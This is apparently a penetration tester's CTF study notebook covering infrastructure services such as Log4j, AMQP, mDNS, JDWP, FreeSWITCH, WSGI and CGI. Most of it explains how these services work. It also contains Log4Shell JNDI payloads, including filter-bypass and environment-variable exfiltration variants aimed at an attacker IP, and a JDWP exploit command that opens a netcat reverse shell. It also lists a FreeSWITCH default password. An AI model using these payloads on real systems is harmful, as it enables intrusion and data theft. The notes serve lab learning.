<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Infrastructure</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Infrastructure</h1><br/><p><h1>Log4j / Log4Shell</h1></p><p>[CTF 141-142, Web App 15-19, CTF B 139-143]</p><p>(Check Parrot-vm for github repo with Log4j toolsuite?)</p><p></p><p>Affects Log4j &lt; <strong>2.17.1 </strong>(excluding security fix releases 2.3.2 and 2.12.4)</p><p></p><p>I know of 4 CVEs, but the fundemental principals are the same:</p><p></p><p> CVE-2021-4428 (patched in version 2.15), CVE-2021-45046 ( patched in version 2.16), CVE-2021-45105 (version 2.17), CVE-2021-44832 (patched in version 2.17.1)</p><p> </p><p> <span style="color:#f66151;">Tool Warning</span>: Many of the tools for Log4shell can no longer be compiled (AFAIK) due to JDK Devs removing “vulnerable” dependecies. I prev compiled <strong>marshallsec</strong>, so I can still use it, but you may need other tools for different situations.</p><p></p><p><h2>Background</h2></p><p> Due to the popularity of Log4j, Log4Shell was one of the “largest &amp; most critical vulnerabilities ever.” In 2021 may have affected ~93% of enterprise cloud environments with CVSS 10/10.</p><p></p><p>Log4j is a Java logging utility library created by Apache (but can be present in an Java Application).</p><p></p><p>When an attacker has control over a string that will be logged by a vuln Log4j instance, the attacker can trick the application into requesting &amp; executing the attacker&#39;s code.</p><p></p><p>The attacker will be able to gain control over any internet connected service that implements a vuln ver of the Log4j library anywhere in the stack.</p><p></p><p> For example, if  a public server passes data to a PC, which then passes the data to a different server that uses Log4j, that 3rd machine can be compromised even though it&#39;s not directly accessible &amp; can be used to attack the other 2 machines.</p><p></p><p><h3>Delivery</h3></p><p>There are many types of user input that may be passed into the Log4j library depending on how it&#39;s implemented, For example:</p><p></p><p>HTTP Headers (e.g. User-Agent), URL Requests, File Uploads, etc.</p><p></p><p>Sometimes you may <span style="color:#ff0000;">need to bypass certain filters</span>.</p><p></p><p><span class="subheading">XML File Upload with Bypass</span>: For example, a bypass for a Web App that allows XML file uploads could be modifying the former payload into the latter.</p><p></p><p><strong>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</strong><strong></strong></p><p><strong>&lt;post&gt;${jndi:ldap://10.2.11.116:1389}&lt;/post&gt;</strong></p><p></p><p><strong>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</strong><strong></strong></p><p><strong>&lt;post&gt;${${::-j}ndi:ldap://10.2.11.116:1389}&lt;/post&gt;</strong></p><p> </p><p><h3>Weaponization</h3></p><p>Even if you can&#39;t get RCE, may be able to exfil valuable information.</p><p> </p><p>CVE-2021-44832 is less sever than prior exploits, since permissions are required, but it can be good for Post-Exploitation.</p><p></p><p></p><p><h2>Detection</h2></p><p>Depending on the implementation, 1 or all of the following types payloads may work:</p><p></p><p><h3>Exfiltrate data</h3></p><p>[Web App 16 has more payloads]</p><p>For example, Environment Variables.</p><p></p><p><strong>${sys:os.name}</strong></p><p></p><p><strong>${env:PWD}</strong></p><p></p><p><h3>Connect to Attacker&#39;s Server</h3></p><p>Can test for a connection with a standard netcat listener, but for full exploitation, try <a href="https://github.com/mbechler/marshalsec/tree/master">marshallsec</a> for a malicious JNDI LDAP server [CTF 142 for JNDI] .</p><p></p><p><span class="subheading">Combination Payload</span>: May be able to exfiltrate data that you can read via the connection to your server.</p><p></p><p><strong>${${::-j}ndi:${::-l}dap://10.2.11.116:1389/${env:PWD}}</strong></p><p></p><p><h3>RCE</h3></p><p>[CTF B 140-141]</p><p></p><p>Query seemed to differ for the BusyBox payload?</p><p></p><p><h2>Using RMI Instead of LDAP?</h2></p><p>[CTF B 143]</p><p></p><p>Had issues trying to exploit a <strong>Spring Boot</strong> server, &amp; needed to use an RMI server instead of an LDAP server (don&#39;t know if this is a specific situation or for <strong>Spring Boot</strong> more broadly).</p><p></p><p>See this <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">article</a> for additional information.</p><p></p><p><a name="AMQP"></a><h1>AMQP (Advanced Message Queuing Protocol)</h1><span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span>[CTF D 25-27]</p><p><h2>Background</h2></p><p>FOSS protocol designed for message queueing, routing, &amp; de;overy across different systems &amp; languages. Uses port <strong>5672</strong> by default.</p><p></p><p>When you connect to <a href="Appendix--Erlang_(erl)_99.html#RabbitMQ">RabbitMQ</a> from an App, you typically use AMQP to interact with it.</p><p></p><p><h3>Functionality</h3></p><p>I believe that AMQP&#39;s main functionality works in 3 stages:</p><p><ol><li>Producers send messages to Exchanges</li></ol></p><p><ol><li>Exchanges route messages to queues based on rules (bindings)</li></ol></p><p><ol><li>Consumers retrieve messages from queues (&amp; may send message acknowledgements)</li></ol></p><p></p><p><h2>Exploitation</h2></p><p>See <a href="https://hacktricks.boitatech.com.br/pentesting/5671-5672-pentesting-amqp">Hacktricks</a> for Recon &amp; <a href="https://exploit-notes.hdks.org/exploit/network/protocol/amqp-pentesting/">Exploit-Notes</a> for Exploitation. See <a href="Appendix--Erlang_(erl)_99.html#RabbitMQ">RabbitMQ</a> for example.</p><p></p><p></p><p><h1>mDNS (Multicast DNS)</h1></p><p>Port <strong>5353/udp</strong> by default.</p><p></p><p><h2>Background</h2></p><p>mDNS enables DNS-like operations within local networks without needing a traditional DNS server. It operates on UDP port 5353 and allows devices to discover each other and their services, commonly seen in various IoT devices.</p><p></p><p>DNS Service Discovery (DNS-SD), often used alongside mDNS, aids in identifying services available on the network through standard DNS queries.</p><p></p><p><h3>Use Case</h3></p><p>In environments without a standard DNS server, mDNS allows devices to resolve domain names ending in .local by querying the multicast address 224.0.0.251 (IPv4) or FF02::FB (IPv6).</p><p></p><p>Important aspects of mDNS include a Time-to-Live (TTL) value indicating record validity and a QU bit distinguishing between unicast and multicast queries.</p><p></p><p>Security-wise, it&#39;s crucial for mDNS implementations to verify that the packet&#39;s source address aligns with the local subnet.</p><p></p><p><h3>DNS-SD (DNS Service Discovery)</h3></p><p>DNS-SD facilitates the discovery of network services by querying for pointer records (PTR) that map service types to their instances.</p><p></p><p>Services are identified using a _&lt;Service&gt;._tcp or _&lt;Service&gt;._udp pattern within the .local domain, leading to the discovery of corresponding SRV and TXT records which provide detailed service information.</p><p></p><p><h2>Enumeration</h2></p><p>Identify open mDNS ports and the services advertised over them.</p><p></p><p><em>sudo nmap -p5353 -sUC rabbit.thm</em></p><p></p><p><a name="PhpMyAdmin"></a><h1>PhpMyAdmin (PMA)</h1></p><p>A <span style="color:#e01b24;">web interface for managing MySQL</span> DB&#39;s. Often used in conjunction with PHP Web Apps (e.g. WordPress). May be configured to only allow logins from <strong>localhost</strong>.</p><p></p><p>Creds are usually hardcoded into a Web App Config file (i.e. <strong>wp-config.php</strong>).</p><p></p><p>Typically found at either <strong>/phpmyadmin</strong> or <strong>/pma</strong>. It may have multiple DB&#39;s (e.g. for different subdomains), so verify which one is being used by the target Web App.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If you can&#39;t sign in with valid creds, try restarting the machine.</p><p></p><p><h1>PHP-FPM</h1></p><p>PHP-FPM (FastCGI Process Manager) is an alternative to FastCGI implementation of PHP with some additional features useful for sites with high traffic.</p><p></p><p>It is the preferred method of processing PHP pages with NGINX and is faster than traditional CGI based methods such as SUPHP or mod_php for running a PHP script.</p><p></p><p>PHP-FPM offers a higher standard of security than other PHP processors, as it allows opcode caching with isolated PHP processing for every user. Opcode caching is ineffective when leveraging CGI and suPHP handlers because of how they handle memory usage.</p><p></p><p>PHP-FPM cannot directly manage incoming HTTP traffic, necessitating a web server to act as a reverse proxy.</p><p></p><p><h1>JDWP (Java Debug Wire Protocol)</h1></p><p>Typically runs on port 8000, but not always. Notortious for RCE vuln (any version?). May/may not be listening on 127.0.0.1 only. If running with elevated privs, <a href="PrivEsc_8.html">PrivEsc</a> vector.</p><p></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol">Hacktricks</a> reccomended <a href="file:///home/user/sploits/java/jdwp_JavaDebugWireProtocol/jdwp-shellifier">payload</a> worked better than the one from Exploit-DB.</p><p></p><p><h2>Triggering: Default Method</h2><h2> </h2><strong><h2>([+] Waiting for an event on &#39;accept&#39;)</h2></strong></p><p>After running the client tool, must also manually trigger the specified payload. This can be done using <strong>nc</strong> to scan port 5000 (opened upon running the client tool?).</p><p></p><p>Need diff method of triggering if you change the def behavior with<strong> --break-on</strong></p><p></p><p><em>python3 jdwp-shellifier.py -t IP -p PORT -c &#39;/usr/bin/busybox nc ATKER 8000 -e /bin/bash&#39;</em></p><p><strong>{In New Terminal}</strong> <em>nc TARGET 5000 -z</em></p><p></p><p></p><p><h1>FreeSWITCH</h1></p><p><strong>8021</strong>/tcp open  freeswitch-event syn-ack ttl 125<strong> FreeSWITCH mod_event_socket</strong></p><p></p><p><span style="color:#ff0000;">Default password</span> is <span style="color:#ff0000;">ClueCon</span></p><p></p><p>RCE (at least in some versions) see <a href="https://www.exploit-db.com/exploits/47799">Exploit-DB</a> &amp; <a href="https://www.exploit-db.com/exploits/47698">Metasploit</a> ← change target ID if Windows host</p><p></p><p><a name="Werkzeug (WSGI)"></a><h1>WSGI</h1></p><p>The Web Server Gateway Interface (WSGI) is a standard that defines how web servers communicate with Python-based web applications.</p><p></p><p>There are many web servers out there (e.g. Apache, Nginx, Lighttpd, etc), &amp; many Python web frameworks (e.g. Django, Flask, Tornado, Pyramid, etc). It would be awfully convenient if these were all interoperable. That&#39;s where WSGI comes in. </p><p><ul><li>There are two sides involved in responding to a client&#39;s HTTP request: the web server and the web application. The server handles the intricacies of the network connections, receiving the request, and sending the response.</li></ul></p><p></p><p>The application takes the request data, acts on it, and crafts the response for the server to send back.</p><p><ul><li>If you want to write a Python web application, make sure it has a callable object (such as a function) that accepts certain parameters for HTTP headers, input form data, environment variables, etc.</li></ul></p><p><ul><li>If you want to write a web server that serves Python apps, make it call that callable object from the application every time an HTTP request comes in.</li></ul></p><p><ul><li>The WSGI specification (in <a href="https://peps.python.org/pep-3333/">PEP 3333</a>) specifies exactly what the parameters for that callable must be and what the return value should be, so every server knows how to talk to every application and vice versa.</li></ul></p><p></p><p><h2>Werkzeug + WSGI</h2></p><p>(See above bullet points)</p><p></p><p>Every web application needs to provide this callable and be able to handle the specific parameters it receives. Every application needs to do this. This is simplified by using a library, like Werkzeug.</p><p></p><p>Werkzeug provides a bunch of utilities for developing WSGI-compliant applications.</p><p></p><p>These utilities do things like parsing headers, sending and receiving cookies, providing access to form data, generating redirects, generating error pages when there&#39;s an exception, even providing an interactive debugger that runs in the browser.</p><p></p><p>It&#39;s really quite comprehensive. Flask then builds upon this foundation (and Jinja, Click, etc.) to provide a complete web framework.</p><p></p><p>So, if Werkzeug is a library for applications, why is it showing up in the server header? Werkzeug does have a module for the server role as well. This is purely for convenience purposes.</p><p></p><p><h2>WSGI Use Case</h2></p><p>Werkzeug (WSGI library) is like a communicator between your python code and an http server (e.g. nginx/apache).</p><p></p><p>WSGI has two sides: the &quot;server&quot; or &quot;gateway&quot; side (often a web server such as Apache or Nginx), &amp; the &quot;application&quot; or &quot;framework&quot; side (the Python script itself).</p><p></p><p>To process a WSGI request, the server side executes the application and provides environment information and a callback function to the application side.</p><p></p><p>The application processes the request, returning the response to the server side using the callback function it was provided.</p><p></p><p>Between the server and the application, there may be a WSGI middleware, which implements both sides of the API. The server receives a request from a client and forwards it to the middleware.</p><p></p><p>After processing, it sends a request to the application. The application&#39;s response is forwarded by the middleware to the server and ultimately to the client. There may be multiple middlewares forming a stack of WSGI-compliant applications.</p><p></p><p><a name="CGI"></a><h1>Web App CGI</h1></p><p>CGI (Common Gateway Interface) is a standard protocol used to enable web servers to interact with external programs (often scripts or applications) to generate dynamic content on websites. More common on earlier Web Servers due to modern alternatives.</p><p></p><p>It allows web servers to pass requests to external programs (like scripts written in Perl, Python, or Bash) and then send the program&#39;s output (such as HTML) back to the client&#39;s browser.</p><p></p><p>In simpler terms, CGI provides a way for web servers to execute external programs in response to web requests, often to create dynamic web pages.</p><p></p><p><h2>How CGIs Work</h2></p><p>When a user makes a request to a web server (e.g., by clicking a link or submitting a form), the server can invoke a CGI program based on the URL or other factors.</p><p></p><p>The CGI program then processes the request (such as handling a form submission, querying a database, or executing a script), and it generates an appropriate response (such as HTML or data) that the web server sends back to the user&#39;s browser.</p><p></p><p>When you call a CGI, the web server (e.g. Apache or Nginx) will start a new process and run the CGI. Here it will start a Bash process and run the CGI script.</p><p></p><p>Apache needs to pass information to the CGI script. To do so, it uses environment variables. Environment variables are available inside the CGI script.</p><p></p><p>It allows Apache to easily pass every header (amongst other information) to the CGI. If you have an HTTP header named <strong>Blah</strong> in your request, you will have an environment variable named <strong>HTTP_BLAH</strong> available in your CGI.</p><p></p><p><h3>Example of CGI in Action</h3><ol><li>A user submits a form with their name on a website.</li></ol></p><p><ol><li>The form sends the data to a CGI script (such as process_form.cgi).</li></ol></p><p><ol><li>The script processes the data, and it generates a response, like &quot;Hello, [user&#39;s name]!&quot;.</li></ol></p><p><ol><li>The web server sends this response back to the user&#39;s browser.</li></ol></p><p></p><p><a name="Round Cube"></a><h1>Round Cube (Mail)</h1></p><p>[CTF D 11]</p><p></p><p>A web interface for mail. May be <span style="color:#ff0000;">implemented as a subdomain</span> (e.g. <strong>adminroundcubemail.site.com</strong> for a <a href="Recon_+_Services--WebApp--Software--WordPress_24.html">WordPress</a> site).</p><p></p><p><h2>Authentication</h2></p><p>Login initially failed, but <span style="color:#ff0000;">worked after refreshing</span> with <strong>F5</strong> (clear cache) &amp; retrying.</p><p></p><p><strong>Hydra</strong> <span style="color:#ff0000;">wasn&#39;t working</span>. It kept throwing the following error with http-form-post (http-get also failed because the target is not using HTTP Auth like <strong>Hydra</strong> thought).</p><p></p><p><strong>target is using HTTP auth, not a webform...use http-get instead</strong></p><p></p><p>I tried adding an HTTP Header with the Session Cookie, but that didn&#39;t fix it.</p><p></p><p><h1>Monitorr</h1></p><p>[CTF B 189]</p><p></p><p>A self-hosted PHP Web App that monitors the status of local &amp; remote Network SVCs, Wesbites, &amp; Apps.</p><p></p><p>The version should be listed at the bottom of the screen, &amp; some versions are vulnerable to things like RCE.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: This is a reminder that “misspelled” words may actually be the name for SW. Since this has an extra “r&quot; it&#39;s easy to research online.</p><p></p><p><h1>Jetty</h1></p><p>A Java Web Server and Java Servlet container, often used to run Web App SW like Jenkins (like how Apache is a PHP server that can be used to run a Wordpress Web App).</p><p></p><p><h1>(PBX) sipXcom / sipXopenfire</h1></p><p>CoreDial&#39;s sipXcom is a PBX server. It bundles an XMPP server component sipXopenfire, which is disabled by default.</p><p>sipXopenfire is affected by an OS command argument injection vulnerability  (<a href="https://seclists.org/fulldisclosure/2023/Mar/5">CVE-2023-25356</a>).</p><p></p><p>It&#39;s used as a VoIP phone for calling / sending messages over the internet. This software provided a web interface.</p><p></p><p>Access the service using <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#pidgin">pidgin</a> &amp; then start chats.</p><p></p><p><h1>Definitions</h1></p><p><a name="Binary Protocol"></a><h2>Binary Protocol</h2></p><p>Text based protocols use Human Readable characters which then must be parsed / interpretted by a machine (e.g HTTP Headers). Binary Protocols use less characters &amp; are quicker since they&#39;re machine readable.</p></div>
</body>
</html>
